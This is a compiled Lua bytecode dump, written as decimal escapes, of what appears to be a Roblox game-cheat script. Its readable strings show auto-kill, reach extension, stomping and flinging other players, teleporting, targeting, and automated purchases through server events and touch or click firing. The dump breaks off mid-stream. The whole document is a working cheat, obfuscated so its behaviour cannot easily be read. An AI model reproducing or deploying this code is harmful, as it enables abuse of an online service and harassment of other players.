118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\8\0\0\0\82\101\97\99\104\86\50\0\3\0\0\0\0\0\0\0\0\4\10\0\0\0\65\117\116\111\45\75\105\108\108\0\4\9\0\0\0\65\117\116\111\75\105\108\108\0\4\6\0\0\0\112\114\105\110\116\0\4\18\0\0\0\65\117\116\111\75\105\108\108\32\68\105\115\97\98\108\101\100\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\4\4\0\0\0\110\101\119\0\2\0\0\0\0\0\0\0\222\0\0\0\243\0\0\0\1\0\0\2\5\0\0\0\5\0\0\0\100\0\0\0\4\0\0\0\28\192\0\1\30\0\128\0\1\0\0\0\4\6\0\0\0\112\99\97\108\108\0\1\0\0\0\0\0\0\0\223\0\0\0\242\0\0\0\1\0\0\9\127\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\6\128\64\0\6\192\64\0\23\0\65\0\22\128\29\128\5\64\1\0\69\128\1\0\75\192\193\0\193\0\2\0\92\128\128\1\75\64\194\0\92\0\0\1\28\0\1\0\22\192\26\128\70\1\64\2\70\129\194\2\70\193\194\2\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\65\67\3\134\193\66\3\77\129\129\2\70\129\195\2\25\192\195\2\22\128\23\128\69\129\1\0\70\1\194\2\70\1\195\2\70\1\192\2\75\1\196\2\193\65\4\0\92\129\128\1\90\1\0\0\22\64\21\128\69\129\1\0\70\1\194\2\70\1\195\2\70\1\192\2\75\1\196\2\193\65\4\0\92\129\128\1\75\129\196\2\193\193\4\0\92\129\128\1\90\1\0\0\22\64\3\128\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\139\1\68\3\1\66\4\0\156\129\128\1\134\193\68\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\22\192\14\128\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\193\69\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\65\67\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\1\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\65\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\129\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\1\67\3\134\1\64\3\134\193\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\33\128\0\0\22\64\228\127\30\0\128\0\28\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\10\0\0\0\65\116\116\97\99\107\105\110\103\0\4\6\0\0\0\86\97\108\117\101\0\1\1\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\73\64\4\22\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\0\4\5\0\0\0\84\111\111\108\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\7\0\0\0\72\97\110\100\108\101\0\4\18\0\0\0\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\3\0\0\0\0\0\0\0\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\10\0\0\0\82\105\103\104\116\70\111\111\116\0\4\9\0\0\0\76\101\102\116\70\111\111\116\0\4\14\0\0\0\82\105\103\104\116\76\111\119\101\114\76\101\103\0\4\13\0\0\0\76\101\102\116\76\111\119\101\114\76\101\103\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\245\0\0\0\22\1\0\0\2\0\0\7\102\0\0\0\5\0\0\0\6\64\64\0\68\0\0\0\6\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\23\128\65\0\22\192\12\128\5\192\1\0\100\0\0\0\4\0\128\0\28\64\0\1\4\0\128\0\6\128\64\0\6\0\66\0\69\64\2\0\70\128\194\0\133\0\0\0\134\64\64\1\196\0\0\0\134\192\0\1\134\128\64\1\134\192\66\1\134\0\67\1\197\64\3\0\198\128\194\1\1\129\3\0\65\193\3\0\129\129\3\0\220\128\0\2\140\192\0\1\92\128\0\1\9\64\128\132\5\0\4\0\28\64\128\0\4\0\128\0\6\128\64\0\6\0\66\0\69\64\2\0\70\128\194\0\133\0\0\0\134\64\64\1\196\0\0\0\134\192\0\1\134\128\64\1\134\192\66\1\134\0\67\1\197\64\3\0\198\128\194\1\1\129\3\0\65\65\4\0\129\129\3\0\220\128\0\2\140\192\0\1\92\128\0\1\9\64\128\132\5\192\1\0\100\64\0\0\4\0\128\0\28\64\0\1\5\0\0\0\6\64\64\0\68\0\0\0\6\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\23\128\68\0\22\0\7\128\5\0\0\0\11\192\68\0\129\0\5\0\28\128\128\1\6\64\69\0\11\128\69\0\129\192\5\0\28\64\128\1\4\0\128\0\6\128\64\0\6\0\66\0\69\64\2\0\70\128\194\0\133\0\0\0\134\64\64\1\196\0\0\0\134\192\0\1\134\128\64\1\134\192\66\1\134\0\67\1\197\64\3\0\198\128\194\1\1\129\3\0\65\1\6\0\129\129\3\0\220\128\0\2\140\192\0\1\92\128\0\1\9\64\128\132\30\0\128\0\25\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\4\0\0\0\75\46\79\0\4\6\0\0\0\86\97\108\117\101\0\1\0\4\6\0\0\0\112\99\97\108\108\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\0\42\192\4\5\0\0\0\119\97\105\116\0\3\0\0\0\0\0\0\40\192\1\1\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\10\0\0\0\77\97\105\110\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\4\6\0\0\0\83\116\111\109\112\0\3\0\0\0\0\0\0\8\64\2\0\0\0\0\0\0\0\252\0\0\0\252\0\0\0\1\0\0\3\9\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\11\128\64\0\132\0\0\0\134\192\64\1\134\0\65\1\28\64\128\1\30\0\128\0\5\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\10\0\0\0\69\113\117\105\112\84\111\111\108\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\7\0\0\0\67\111\109\98\97\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3\1\0\0\5\1\0\0\1\0\0\2\6\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\11\128\64\0\28\64\0\1\30\0\128\0\3\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\7\0\0\0\67\111\109\98\97\116\0\4\9\0\0\0\65\99\116\105\118\97\116\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\48\1\0\0\93\1\0\0\2\0\0\6\141\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\8\0\0\0\4\0\0\0\6\64\65\0\11\128\65\0\129\192\1\0\28\128\128\1\6\0\66\0\6\64\66\0\7\0\1\0\4\0\0\0\6\64\65\0\11\128\65\0\129\192\1\0\28\128\128\1\6\0\66\0\6\192\66\0\7\128\2\0\4\0\0\0\6\64\65\0\11\128\65\0\129\192\1\0\28\128\128\1\6\0\66\0\6\64\67\0\7\0\3\0\4\0\128\0\100\0\0\0\71\128\3\0\26\0\0\0\22\64\15\128\69\0\0\0\70\128\192\0\70\0\128\0\70\64\193\0\70\192\195\0\70\0\196\0\70\64\196\0\23\128\196\0\22\0\13\128\69\0\0\0\70\128\192\0\70\192\192\0\70\64\193\0\70\192\193\0\133\0\0\0\134\192\68\1\134\0\69\1\134\64\69\1\134\128\69\1\134\192\69\1\134\0\66\1\73\128\0\132\69\0\6\0\129\64\6\0\92\64\0\1\69\128\6\0\133\0\0\0\134\192\68\1\134\0\69\1\134\64\69\1\134\128\69\1\134\192\70\1\92\64\0\1\69\0\0\0\70\128\192\0\70\192\192\0\70\0\199\0\75\64\199\0\193\128\7\0\92\128\128\1\133\0\0\0\134\128\64\1\134\192\64\1\134\64\65\1\73\128\128\143\69\0\6\0\129\0\8\0\92\64\0\1\69\64\8\0\164\64\0\0\0\0\0\0\92\64\0\1\69\0\0\0\70\128\192\0\70\0\128\0\70\64\193\0\75\128\193\0\193\128\8\0\92\128\128\1\90\0\0\0\22\128\252\127\22\64\4\128\69\0\0\0\70\128\192\0\70\0\128\0\70\64\193\0\70\192\195\0\70\0\196\0\70\64\196\0\23\192\200\0\22\0\2\128\69\0\0\0\70\0\201\0\75\64\201\0\193\128\9\0\10\193\0\0\9\1\202\147\9\129\202\148\9\1\203\149\92\64\0\2\69\0\0\0\70\128\192\0\70\0\128\0\70\64\193\0\75\128\193\0\193\128\8\0\92\128\128\1\90\0\0\0\22\192\3\128\69\0\0\0\75\64\192\0\193\128\0\0\92\128\128\1\70\192\192\0\72\0\0\0\68\0\0\0\70\64\193\0\70\192\193\0\133\0\2\0\134\64\75\1\197\0\1\0\5\129\2\0\69\1\3\0\156\128\0\2\73\128\0\132\30\0\128\0\46\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\3\0\0\0\88\49\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\2\0\0\0\88\0\4\3\0\0\0\89\49\0\4\2\0\0\0\89\0\4\3\0\0\0\90\49\0\4\2\0\0\0\90\0\4\8\0\0\0\103\101\116\82\111\111\116\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\4\0\0\0\75\46\79\0\4\6\0\0\0\86\97\108\117\101\0\1\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\5\0\0\0\83\104\111\112\0\4\17\0\0\0\91\66\114\111\119\110\66\97\103\93\32\45\32\36\50\53\0\4\5\0\0\0\72\101\97\100\0\4\5\0\0\0\119\97\105\116\0\3\51\51\51\51\51\51\211\63\4\18\0\0\0\102\105\114\101\99\108\105\99\107\100\101\116\101\99\116\111\114\0\4\14\0\0\0\67\108\105\99\107\68\101\116\101\99\116\111\114\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\11\0\0\0\91\66\114\111\119\110\66\97\103\93\0\4\7\0\0\0\80\97\114\101\110\116\0\3\0\0\0\0\0\0\224\63\4\6\0\0\0\112\99\97\108\108\0\4\15\0\0\0\67\104\114\105\115\116\109\97\115\95\83\111\99\107\0\1\1\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\24\0\0\0\68\51\52\84\72\95\51\86\49\76\32\91\84\97\114\103\101\116\32\71\117\105\93\0\4\5\0\0\0\84\101\120\116\0\4\22\0\0\0\84\104\101\32\116\97\114\103\101\116\32\105\115\32\107\110\111\99\107\101\100\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\3\0\0\0\0\0\0\28\64\4\4\0\0\0\110\101\119\0\2\0\0\0\0\0\0\0\58\1\0\0\61\1\0\0\0\1\0\4\15\0\0\0\75\0\64\0\193\64\0\0\92\128\128\1\90\64\0\0\22\192\1\128\75\0\64\0\193\128\0\0\92\128\128\1\90\64\0\0\22\128\0\128\75\0\64\0\193\192\0\0\92\128\128\1\94\0\0\1\30\0\128\0\4\0\0\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\6\0\0\0\84\111\114\115\111\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\71\1\0\0\75\1\0\0\1\0\0\6\32\0\0\0\5\0\0\0\28\64\128\0\5\64\0\0\69\128\0\0\70\192\192\0\132\0\0\0\70\128\128\0\70\0\193\0\28\128\0\1\69\64\0\0\133\128\0\0\134\192\64\1\134\128\65\1\134\0\65\1\92\128\0\1\70\64\193\0\133\192\1\0\134\0\66\1\193\64\2\0\1\129\2\0\65\193\2\0\156\128\0\2\76\128\128\0\9\64\128\130\5\128\0\0\6\192\64\0\6\128\65\0\6\0\65\0\6\0\67\0\11\64\67\0\28\64\0\1\30\0\128\0\14\0\0\0\4\5\0\0\0\119\97\105\116\0\4\8\0\0\0\103\101\116\82\111\111\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\7\0\0\0\67\70\114\97\109\101\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\8\64\3\0\0\0\0\0\0\0\0\4\11\0\0\0\91\66\114\111\119\110\66\97\103\93\0\4\9\0\0\0\65\99\116\105\118\97\116\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\106\1\0\0\174\1\0\0\6\0\0\6\88\0\0\0\4\0\0\0\23\0\64\0\22\192\15\128\4\0\128\0\9\128\192\128\2\0\128\0\8\0\0\0\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\6\128\65\0\8\0\0\1\4\0\0\1\6\0\66\0\11\64\66\0\129\128\2\0\28\128\128\1\6\192\66\0\6\0\67\0\7\192\1\0\4\0\0\1\6\0\66\0\11\64\66\0\129\128\2\0\28\128\128\1\6\192\66\0\6\128\67\0\7\64\3\0\4\0\0\1\6\0\66\0\11\64\66\0\129\128\2\0\28\128\128\1\6\192\66\0\6\0\68\0\7\192\3\0\3\0\0\0\68\0\128\1\70\0\194\0\70\128\194\0\70\64\196\0\164\0\0\0\4\0\0\2\4\0\128\2\4\0\128\1\228\64\0\0\0\0\128\0\4\0\128\1\0\0\0\0\0\0\0\1\36\129\0\0\0\0\0\0\4\0\128\1\0\0\128\0\64\1\128\1\92\65\128\0\69\129\4\0\92\65\128\0\68\1\128\0\70\65\192\2\23\192\196\2\22\64\254\127\64\1\0\2\92\65\128\0\35\0\0\0\22\192\4\128\4\0\128\0\9\192\196\128\2\0\0\0\8\0\0\0\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\6\128\65\0\8\0\0\1\4\0\0\1\6\0\66\0\6\128\66\0\69\192\2\0\70\0\197\0\133\192\1\0\197\64\3\0\5\193\3\0\92\128\0\2\9\64\128\133\30\0\128\0\21\0\0\0\1\0\4\5\0\0\0\84\101\120\116\0\4\8\0\0\0\85\110\70\108\105\110\103\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\3\0\0\0\88\49\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\2\0\0\0\88\0\4\3\0\0\0\89\49\0\4\2\0\0\0\89\0\4\3\0\0\0\90\49\0\4\2\0\0\0\90\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\5\0\0\0\119\97\105\116\0\4\6\0\0\0\70\108\105\110\103\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\118\1\0\0\149\1\0\0\3\0\0\5\14\0\0\0\5\0\0\0\100\0\0\0\4\0\0\0\4\0\128\0\4\0\0\1\28\192\0\1\90\0\0\0\22\0\1\128\133\64\0\0\193\128\0\0\0\1\128\0\213\0\129\1\156\64\0\1\30\0\128\0\3\0\0\0\4\6\0\0\0\112\99\97\108\108\0\4\6\0\0\0\112\114\105\110\116\0\4\15\0\0\0\102\108\105\110\103\32\101\114\114\111\114\32\58\32\0\1\0\0\0\0\0\0\0\119\1\0\0\145\1\0\0\3\0\0\11\135\0\0\0\4\0\0\0\11\0\64\0\132\0\128\0\28\128\128\1\6\64\64\0\26\0\0\0\22\128\31\128\68\0\0\1\70\64\192\0\90\0\0\0\22\128\30\128\70\192\64\0\71\128\0\0\65\0\1\0\129\64\1\0\198\128\65\0\198\192\193\1\198\0\194\1\24\64\194\1\22\128\0\128\210\0\0\1\199\128\2\0\22\0\2\128\198\128\65\0\198\192\193\1\198\0\194\1\24\192\128\132\22\64\0\128\135\128\2\0\22\64\0\128\193\64\2\0\199\128\2\0\198\128\65\0\198\192\193\1\198\192\194\1\24\64\194\1\22\128\0\128\210\0\0\1\199\0\3\0\22\0\2\128\198\128\65\0\198\192\193\1\198\192\194\1\24\192\128\132\22\64\0\128\135\0\3\0\22\64\0\128\193\64\2\0\199\0\3\0\196\0\0\1\198\64\192\1\218\0\0\0\22\0\20\128\196\0\0\1\198\64\192\1\203\64\195\1\65\129\1\0\220\128\128\1\203\128\195\1\65\193\3\0\220\64\128\1\196\0\0\1\198\64\192\1\198\0\196\1\5\65\4\0\6\129\68\2\69\129\0\0\70\193\196\2\70\1\194\2\133\1\5\0\134\65\69\3\210\1\128\0\0\2\128\0\156\129\128\1\76\129\129\2\133\129\2\0\76\129\129\2\133\129\0\0\134\193\68\3\134\129\69\3\197\129\0\0\198\193\196\3\198\193\194\3\5\2\5\0\6\66\69\4\82\2\128\0\128\2\128\0\28\130\128\1\204\1\130\3\5\2\3\0\204\1\130\3\28\129\0\2\69\65\4\0\70\193\197\2\133\1\5\0\134\1\70\3\196\1\0\1\198\65\192\3\198\1\196\3\198\65\198\3\198\1\194\3\204\129\198\3\156\129\0\1\197\1\5\0\198\1\198\3\4\2\0\1\6\66\64\4\6\2\68\4\6\66\70\4\6\130\69\4\12\194\70\4\220\129\0\1\5\2\5\0\6\2\70\4\68\2\0\1\70\66\192\4\70\2\196\4\70\66\198\4\70\194\194\4\76\2\199\4\28\2\0\1\92\129\0\0\14\65\1\2\201\0\129\136\196\0\0\1\198\64\192\1\198\0\196\1\5\129\7\0\6\129\68\2\65\193\7\0\129\193\7\0\193\193\7\0\28\129\0\2\201\0\129\142\30\0\128\0\32\0\0\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\11\0\0\0\70\108\105\110\103\84\111\114\115\111\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\3\205\204\204\204\204\204\14\64\3\0\0\0\0\0\0\24\64\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\14\0\0\0\77\111\118\101\68\105\114\101\99\116\105\111\110\0\4\2\0\0\0\88\0\3\0\0\0\0\0\0\0\0\4\8\0\0\0\120\99\104\97\110\103\101\0\4\2\0\0\0\90\0\4\8\0\0\0\122\99\104\97\110\103\101\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\12\0\0\0\67\104\97\110\103\101\83\116\97\116\101\0\3\0\0\0\0\0\0\38\64\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\5\0\0\0\109\97\116\104\0\4\7\0\0\0\114\97\110\100\111\109\0\4\2\0\0\0\89\0\4\7\0\0\0\65\110\103\108\101\115\0\4\4\0\0\0\114\97\100\0\4\12\0\0\0\79\114\105\101\110\116\97\116\105\111\110\0\3\0\0\0\0\0\224\117\64\3\0\0\0\0\0\0\105\64\3\0\0\0\0\0\0\110\64\4\9\0\0\0\86\101\108\111\99\105\116\121\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\0\0\0\0\128\132\30\65\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\150\1\0\0\153\1\0\0\4\0\0\3\15\0\0\0\4\0\128\0\6\0\64\0\6\64\64\0\6\128\64\0\8\0\0\0\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\6\128\65\0\11\192\65\0\132\0\128\1\28\128\128\1\8\0\0\1\30\0\128\0\8\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\10\0\0\0\72\101\97\114\116\98\101\97\116\0\4\8\0\0\0\67\111\110\110\101\99\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\154\1\0\0\160\1\0\0\3\0\0\8\42\0\0\0\4\0\0\0\11\0\64\0\28\64\0\1\5\64\0\0\6\128\64\0\65\192\0\0\129\192\0\0\193\192\0\0\28\128\0\2\68\0\128\0\70\0\193\0\70\64\193\0\73\0\0\131\68\0\128\0\70\0\193\0\70\64\193\0\73\0\128\131\68\0\128\0\70\0\193\0\70\0\194\0\133\64\2\0\134\128\64\1\196\0\0\1\156\128\0\1\197\64\2\0\198\128\194\1\5\193\2\0\6\1\67\2\65\193\0\0\28\129\0\1\69\193\2\0\70\1\195\2\129\65\3\0\92\129\0\1\133\193\2\0\134\1\67\3\193\193\0\0\156\1\0\1\220\128\0\0\142\192\0\1\73\128\128\132\30\0\128\0\14\0\0\0\4\11\0\0\0\68\105\115\99\111\110\110\101\99\116\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\80\114\105\109\97\114\121\80\97\114\116\0\4\9\0\0\0\86\101\108\111\99\105\116\121\0\4\12\0\0\0\82\111\116\86\101\108\111\99\105\116\121\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\7\0\0\0\65\110\103\108\101\115\0\4\5\0\0\0\109\97\116\104\0\4\4\0\0\0\114\97\100\0\3\61\10\215\163\112\61\97\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\197\1\0\0\221\1\0\0\0\0\0\2\9\0\0\0\5\0\0\0\28\128\128\0\26\0\0\0\22\192\0\128\5\64\0\0\100\0\0\0\28\64\0\1\22\192\253\127\30\0\128\0\2\0\0\0\4\5\0\0\0\119\97\105\116\0\4\6\0\0\0\112\99\97\108\108\0\1\0\0\0\0\0\0\0\200\1\0\0\219\1\0\0\0\0\0\7\120\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\0\1\0\28\128\128\1\26\0\0\0\22\0\14\128\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\0\1\0\28\128\128\1\75\64\65\0\193\128\1\0\92\128\128\1\90\0\0\0\22\0\1\128\69\192\1\0\92\64\128\0\70\128\65\0\75\0\194\0\92\64\0\1\75\192\64\0\193\128\1\0\92\128\128\1\23\64\194\0\22\64\22\128\69\128\2\0\70\192\194\0\133\0\0\0\139\0\67\1\1\65\3\0\156\128\128\1\197\128\3\0\134\192\0\1\134\192\67\1\134\0\68\1\134\128\66\1\134\64\68\1\197\0\0\0\203\0\195\1\65\65\3\0\220\128\128\1\5\129\3\0\198\0\129\1\198\192\195\1\198\0\196\1\198\128\194\1\198\128\196\1\204\192\196\1\5\1\0\0\11\1\67\2\129\65\3\0\28\129\128\1\69\129\3\0\6\65\1\2\6\193\67\2\6\1\68\2\6\129\66\2\6\1\69\2\92\128\0\2\9\64\0\133\22\64\13\128\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\64\5\0\28\128\128\1\26\0\0\0\22\64\11\128\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\64\5\0\28\128\128\1\75\192\64\0\193\128\5\0\92\128\128\1\90\0\0\0\22\128\8\128\69\128\2\0\70\192\194\0\133\0\0\0\139\0\67\1\1\65\3\0\156\128\128\1\197\128\3\0\134\192\0\1\134\192\67\1\134\0\68\1\134\128\66\1\134\64\68\1\197\0\0\0\203\0\195\1\65\65\3\0\220\128\128\1\5\129\3\0\198\0\129\1\198\192\195\1\198\0\196\1\198\128\194\1\198\128\196\1\204\192\197\1\5\1\0\0\11\1\67\2\129\65\3\0\28\129\128\1\69\129\3\0\6\65\1\2\6\193\67\2\6\1\68\2\6\129\66\2\6\1\69\2\92\128\0\2\9\64\0\133\30\0\128\0\24\0\0\0\4\5\0\0\0\103\97\109\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\8\0\0\0\71\114\101\110\97\100\101\0\4\22\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\0\4\13\0\0\0\66\111\100\121\86\101\108\111\99\105\116\121\0\4\5\0\0\0\119\97\105\116\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\5\0\0\0\83\107\105\100\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\5\0\0\0\72\101\97\100\0\4\2\0\0\0\88\0\4\2\0\0\0\89\0\3\0\0\0\0\0\0\26\64\4\2\0\0\0\90\0\4\7\0\0\0\72\97\110\100\108\101\0\4\4\0\0\0\80\105\110\0\3\0\0\0\0\0\0\32\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\233\1\0\0\14\2\0\0\4\0\0\5\39\0\0\0\4\0\0\0\23\0\64\0\22\128\7\128\4\0\128\0\9\128\192\128\2\0\128\0\8\0\0\0\5\192\0\0\100\0\0\0\4\0\0\1\28\64\0\1\36\64\0\0\4\0\128\1\4\0\0\1\4\0\128\0\67\0\128\0\164\128\0\0\0\0\128\0\0\0\0\0\228\192\0\0\0\0\128\0\4\0\0\1\0\1\0\1\28\65\128\0\5\1\1\0\28\65\128\0\4\1\128\0\6\65\64\2\23\128\64\2\22\64\254\127\0\1\128\1\28\65\128\0\35\0\0\0\22\192\0\128\2\0\0\0\8\0\0\0\4\0\128\0\9\64\193\128\30\0\128\0\6\0\0\0\1\0\4\5\0\0\0\84\101\120\116\0\4\7\0\0\0\84\97\114\103\101\116\0\4\6\0\0\0\112\99\97\108\108\0\4\5\0\0\0\119\97\105\116\0\4\9\0\0\0\85\110\84\97\114\103\101\116\0\4\0\0\0\0\0\0\0\237\1\0\0\240\1\0\0\1\0\0\2\13\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\6\128\64\0\11\192\64\0\28\64\0\1\4\0\0\0\6\0\64\0\6\0\65\0\6\64\65\0\